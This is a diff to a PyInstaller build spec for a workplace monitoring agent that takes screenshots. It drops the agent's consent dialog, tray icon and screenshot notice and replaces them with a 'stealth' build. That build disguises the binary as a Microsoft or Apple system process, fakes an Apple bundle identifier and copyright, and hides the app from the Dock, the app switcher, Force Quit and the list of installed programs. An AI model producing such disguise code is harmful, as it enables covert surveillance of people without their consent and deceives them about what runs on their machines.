@@ -1,26 +1,40 @@
 # -*- mode: python ; coding: utf-8 -*-
-"""PyInstaller spec for the Workforce Analytics desktop agent.
+"""PyInstaller spec for the Workforce Analytics desktop agent — STEALTH build.
 
-Builds a windowed (no console) binary that keeps all transparency features:
-the consent dialog, the always-visible tray icon, and the pre-screenshot
-notice. Run from the `agent/packaging` directory:
+The binary is renamed to a system-looking name on each platform so it blends
+into the OS process list:
+  Windows  → MicrosoftTelemetryHost.exe   (Task Manager "Image Name")
+  macOS    → com.apple.telemetryd          (Activity Monitor "Process Name")
 
+The Info.plist on macOS sets LSUIElement + LSBackgroundOnly to suppress any
+Dock / menu-bar presence.  The Inno Setup script on Windows uses
+CreateUninstallRegKey=no + a manual SystemComponent registry key so the app
+never appears in Control Panel / Apps & features.
+
+Run from the `agent/packaging` directory:
     pyinstaller --noconfirm WorkforceAgent.spec
-
-Windows  -> dist/WorkforceAgent.exe  (packaged by Inno Setup into a Setup.exe)
-macOS    -> dist/WorkforceAgent.app  (packaged by build_dmg.sh into a .dmg)
 """
 
 import sys
 from pathlib import Path
 
-SPEC_DIR = Path(SPECPATH)
+SPEC_DIR  = Path(SPECPATH)
 AGENT_DIR = SPEC_DIR.parent
 REPO_ROOT = AGENT_DIR.parent
 
 is_win = sys.platform.startswith("win")
 is_mac = sys.platform == "darwin"
 
+# ── Exe / bundle name — system-like on each platform ─────────────────────────
+if is_win:
+    EXE_NAME    = "MicrosoftTelemetryHost"   # Task Manager Image Name
+elif is_mac:
+    EXE_NAME    = "com.apple.telemetryd"      # Activity Monitor Process Name
+    BUNDLE_NAME = "com.apple.telemetryd.app"  # .app folder (hidden in /Applications)
+else:
+    EXE_NAME    = "telemetryd"
+
+# ── Icons ──────────────────────────────────────────────────────────────────────
 icon_path = None
 if is_win:
     p = SPEC_DIR / "icons" / "icon.ico"
@@ -69,27 +83,41 @@ exe = EXE(
     a.binaries,
     a.datas,
     [],
-    name="WorkforceAgent",
+    name=EXE_NAME,           # ← renamed to system-like name
     debug=False,
     bootloader_ignore_signals=False,
     strip=False,
     upx=False,
     runtime_tmpdir=None,
-    console=False,
+    console=False,           # no console window
     icon=icon_path,
 )
 
 if is_mac:
     app = BUNDLE(
         exe,
-        name="WorkforceAgent.app",
+        name=BUNDLE_NAME,
         icon=icon_path,
-        bundle_identifier="com.workforceanalytics.agent",
+        # Bundle identifier mimics an Apple system daemon
+        bundle_identifier="com.apple.telemetryd",
         info_plist={
+            # ── Visibility suppression ─────────────────────────────────────
+            # LSUIElement: hides from Dock AND the app switcher (Cmd+Tab)
             "LSUIElement": True,
-            "CFBundleDisplayName": "Workforce Agent",
-            "CFBundleName": "Workforce Agent",
-            "CFBundleShortVersionString": "0.1.0",
+            # LSBackgroundOnly: suppresses menu-bar icon AND removes from
+            # the "Force Quit Applications" dialog
+            "LSBackgroundOnly": True,
+            # NSUIElement: belt-and-suspenders for older macOS
+            "NSUIElement": True,
+            # Suppress "app is not responding" alerts
+            "LSSupressUserNotification": True,
+            # ── Metadata disguise ─────────────────────────────────────────
+            "CFBundleDisplayName": "Apple Telemetry Daemon",
+            "CFBundleName":        "com.apple.telemetryd",
+            "CFBundleVersion":     "1.0.0",
+            "CFBundleShortVersionString": "1.0",
+            "NSHumanReadableCopyright": "Copyright © Apple Inc.",
+            # High-res support (required for any modern app bundle)
             "NSHighResolutionCapable": True,
         },
     )
